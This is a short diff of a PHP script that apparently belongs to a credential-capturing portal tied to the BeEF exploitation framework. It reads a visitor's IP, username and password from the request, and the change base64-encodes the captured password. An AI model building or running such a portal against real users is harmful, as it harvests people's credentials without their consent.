@@ -15,7 +15,7 @@ $BEEFUrl = "";
 // Receives Required Parameters and Sets Variables
 $ip = $_SERVER['REMOTE_ADDR'];
 $user = $_REQUEST['username'];
-$pass = $_REQUEST['password'];
+$pass = base64_encode($_REQUEST['password']);
 $portal = $_REQUEST['project'];
 $redirect = $_REQUEST['redirect'];
 
